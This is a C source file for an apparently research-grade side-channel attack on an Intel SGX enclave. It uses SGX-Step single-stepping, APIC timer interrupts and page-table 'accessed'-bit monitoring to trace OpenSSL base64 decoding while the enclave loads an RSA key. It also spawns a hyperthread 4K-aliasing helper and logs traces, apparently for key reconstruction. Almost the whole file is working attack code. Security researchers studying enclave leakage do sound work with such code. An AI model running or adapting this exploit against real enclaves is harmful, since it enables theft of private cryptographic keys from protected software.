#include "Enclave/encl_u.h"

#include <sgx_urts.h>

#include <signal.h>

#include "libsgxstep/debug.h"
#include "libsgxstep/sched.h"
#include "libsgxstep/pt.h"
#include "libsgxstep/apic.h"
#include "libsgxstep/enclave.h"
#include "libsgxstep/config.h"
#include "libsgxstep/idt.h"

#include "libcpu.h"
#include "evset.h"

#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <signal.h>

sgx_enclave_id_t eid = 0;
int irq_cnt = 0, do_irq = 1, fault_cnt = 0;

uint64_t *pte_encl = NULL;
uint64_t *pmd_encl = NULL;

// objdump --section=".rodata" -d -M Intel Enclave/encl.so | grep -C 20 "34 35"
uint32_t offset_lt = 0x223340;
// objdump --section=".text" -d -M Intel Enclave/encl.so | grep -C 20 "evp_decodeblock_int" 
uint32_t offset_decodeblock_adrs = 0x10c6a0;
// objdump --section=".text" -d -M Intel Enclave/encl.so | grep -A 300 -B 10 "EVP_DecodeUpdate>:"
// look for 3 succeeding "shl", followed by an "and" and three "or"
uint32_t offset_decodeblock_adrs_inline = 0x10d0df;

uint64_t *decodeblock_adrs;
uint64_t *decodeblock_adrs_inline;
uint64_t *lut_address;

uint64_t *decodeblock_encl_pte = NULL;
uint64_t *decodeblock_encl_inline_pte = NULL;
uint64_t *lut_encl_pte = NULL;

uint64_t last_erip = 0;
unsigned int zero_step_cnt = 0;

int32_t meas_nb = 0;

FILE *out_fp;

uint8_t do_measurement = 0;
unsigned int timer_interval = SGX_STEP_TIMER_INTERVAL;

uint64_t decoding_access_count = 0;

void aep_cb_func(void) {

    if(do_measurement == 1) {

        unsigned int accessed_lut = ACCESSED(*lut_encl_pte);
        unsigned int accessed_decodeblock_func = ACCESSED(*decodeblock_encl_pte) || ACCESSED(*decodeblock_encl_inline_pte);

        uint32_t step_time = nemesis_tsc_aex - nemesis_tsc_eresume;

        uint64_t erip = edbgrd_erip() - (uint64_t) get_enclave_base();

        if (irq_cnt > 0) {
            fprintf(out_fp, ",\n");
        }
        
        // We store the erip, but it is not used for the key reconstruction / attack on the decoding
        fprintf(out_fp, "{\"ic\":%d, \"st\":%u, \"alut\":%d, \"adecf\":%d, \"erip\":%lu}",
                irq_cnt, step_time, accessed_lut, accessed_decodeblock_func, erip);
        
        if(accessed_lut && accessed_decodeblock_func) {
            decoding_access_count++;
        }        

        irq_cnt++;
    }
    *lut_encl_pte = MARK_NOT_ACCESSED(*lut_encl_pte);
    *decodeblock_encl_pte = MARK_NOT_ACCESSED(*decodeblock_encl_pte);
    *decodeblock_encl_inline_pte = MARK_NOT_ACCESSED(*decodeblock_encl_inline_pte);

    /*
     * Configure APIC timer interval for next interrupt.
     *
     * On our evaluation platforms, we explicitly clear the enclave's
     * _unprotected_ PMD "accessed" bit below, so as to slightly slow down
     * ERESUME such that the interrupt reliably arrives in the first subsequent
     * enclave instruction.
     *
     */
    if (do_irq) {
        *pmd_encl = MARK_NOT_ACCESSED(*pmd_encl);
        apic_timer_irq(timer_interval);
    }
}

/* Called upon SIGSEGV caused by untrusted page tables. */
void fault_handler(int signal) {
    info("Caught fault %d! Restoring enclave page permissions..", signal);
    *pte_encl = MARK_NOT_EXECUTE_DISABLE(*pte_encl);
    ASSERT(fault_cnt++ < 10);

    // NOTE: return eventually continues at aep_cb_func and initiates
    // single-stepping mode.
}

void init_enclave(void) {

    int updated = 0;
    sgx_launch_token_t token = { 0 };

    info_event("Creating enclave...");
    SGX_ASSERT(
            sgx_create_enclave("./Enclave/encl.so", /*debug=*/1, &token, &updated, &eid, NULL ));
}

/* Configure and check attacker untrusted runtime environment. */
void attacker_config_runtime(void) {
    ASSERT(!claim_cpu(VICTIM_CPU));
    ASSERT(!prepare_system_for_benchmark(PSTATE_PCT));
    ASSERT(signal(SIGSEGV, fault_handler) != SIG_ERR);
    print_system_settings();

    if (isatty(fileno(stdout))) {
        info("WARNING: interactive terminal detected; known to cause ");
        info("unstable timer intervals! Use stdout file redirection for ");
        info("precise single-stepping results...");
    }

    register_aep_cb(aep_cb_func);
    register_enclave_info();
    print_enclave_info();
}

/* Provoke page fault on enclave entry to initiate single-stepping mode. */
void attacker_config_page_table(void) {
    void *code_adrs;
    sgx_status_t ret = get_rsa_key_load_addr(eid, &code_adrs);
    SGX_ASSERT(ret);

    info("enclave trigger code address at %p\n", code_adrs);
    ASSERT(pte_encl = remap_page_table_level(code_adrs, PTE));
    fprintf(stdout, "pte_encl addr: %p\n", pte_encl);

    decodeblock_adrs = get_enclave_base() + offset_decodeblock_adrs;
    decodeblock_adrs_inline = get_enclave_base() + offset_decodeblock_adrs_inline;
    lut_address = get_enclave_base() + offset_lt;

    ASSERT(decodeblock_encl_pte = remap_page_table_level(decodeblock_adrs, PTE));
    ASSERT(decodeblock_encl_inline_pte = remap_page_table_level(decodeblock_adrs_inline, PTE));
    ASSERT(lut_encl_pte = remap_page_table_level((void* ) lut_address, PTE));

    ASSERT(pmd_encl = remap_page_table_level(get_enclave_base(), PMD));
    fprintf(stdout, "pmd_encl addr: %p\n", pmd_encl);
}

void attacker_interrupt_setup(void) {
    // Using userspace IDT mapping

    idt_t idt = { 0 };

    info_event("Establishing user space APIC/IDT mappings");
    map_idt(&idt);
    // dump_idt(&idt);
    install_kernel_irq_handler(&idt, __ss_irq_handler, IRQ_VECTOR);
    apic_timer_oneshot(IRQ_VECTOR);

    info_event("Triggering user space software interrupts");
    asm("int %0\n\t" ::"i"(IRQ_VECTOR):);
    asm("int %0\n\t" ::"i"(IRQ_VECTOR):);
}

void enable_single_stepping() {

#if SINGLE_STEP_ENABLE
    *pte_encl = MARK_EXECUTE_DISABLE(*pte_encl);
#endif
}

void setup_attacker(void) {

    attacker_config_runtime();
    // attacker_config_page_table();
    attacker_interrupt_setup();
}

void cleanup(void) {
    /* 3. Restore normal execution environment. */
    apic_timer_deadline();
    SGX_ASSERT(sgx_destroy_enclave(eid));
}

void nop() {
}

int main(int argc, char **argv) {

    info("Single stepping timer interval: %u", SGX_STEP_TIMER_INTERVAL);
    
    // The analysis script implicitely derives the offset from the filename
    // When specifying another offset, please use an appropriate filename
    char *file_name = "log-0x68.out";
    uint32_t attack_offset_in_lut_offset = 0x68;

    if (argc >= 2) {
        file_name = argv[1];
    }
    if (argc >= 3) {
        char *offset = argv[2];
        attack_offset_in_lut_offset = (uint64_t) strtoul(offset, NULL, 16);
    }

    out_fp = fopen(file_name, "w");
    fprintf(out_fp, "{\"runs\":[\n");

    init_enclave();
    void *code_adrs;
    get_rsa_key_load_addr(eid, &code_adrs);

    
    fprintf(stdout, "### main.c ### Attacker page table config.\n");
    attacker_config_page_table();
    
    fprintf(stdout, "lut addr: 0x%lx\n", ((uint64_t) lut_address));
    fprintf(stdout, "lut attack offset (pseudo conflict): 0x%lx\n", attack_offset_in_lut_offset);
    fprintf(stdout, "attack address (pseudo conflict): 0x%lx\n", (((uint64_t) lut_address) + attack_offset_in_lut_offset));

    uint32_t attack_offset = (((uint64_t) lut_address) + attack_offset_in_lut_offset) & 0xFFF;
    signal(SIGALRM, nop);

    fprintf(stdout, "### main.c ### Forking \n");
    int pid = fork();
    if (pid == 0) {
        char target_offset[12];

        sprintf(target_offset, "%x",
                    (uint32_t) attack_offset);

        char *app_name = "ht_attack/4kattack";
        char *params[] = { "ht_attack/4kattack", target_offset, NULL };
        char *env[] = { NULL };
        fprintf(stdout, "### main.c [Child] ### Spawning second exec ###\n");
        execve(app_name, params, env);
    } else {
        pause();
        
        fprintf(stdout, "### main.c [Parent] ### Attacker interrupt and runtime config.\n");
        setup_attacker();

        int max_meas = 1000;
        for (int i = 0; i < max_meas; i++) {

            last_erip = 0;
            zero_step_cnt = 0;
            irq_cnt = 0;

            do_measurement = 1;
            enable_single_stepping();
            
            fprintf(out_fp, "{\"run%d\":{\"measurements\":[\n", meas_nb);

            SGX_ASSERT(rsa_key_load(eid));

            meas_nb += 1;

            fprintf(out_fp, "],\n");
            fprintf(out_fp, "\"analysis_result\": {\n");
            fprintf(out_fp, "\"single_stepping_interrupts\": %d,\n", irq_cnt);
            fprintf(out_fp, "\"decoding_access_count\": %d\n", decoding_access_count);
            if (i == (max_meas - 1)) {
                fprintf(out_fp, "}}}");
            } else {
                fprintf(out_fp, "}}},");
            }

            fault_cnt = 0;
        }

        fprintf(out_fp, "]\n}");

        kill(pid, SIGINT);
        cleanup();
    }

    fclose(out_fp);

    return 0;
}
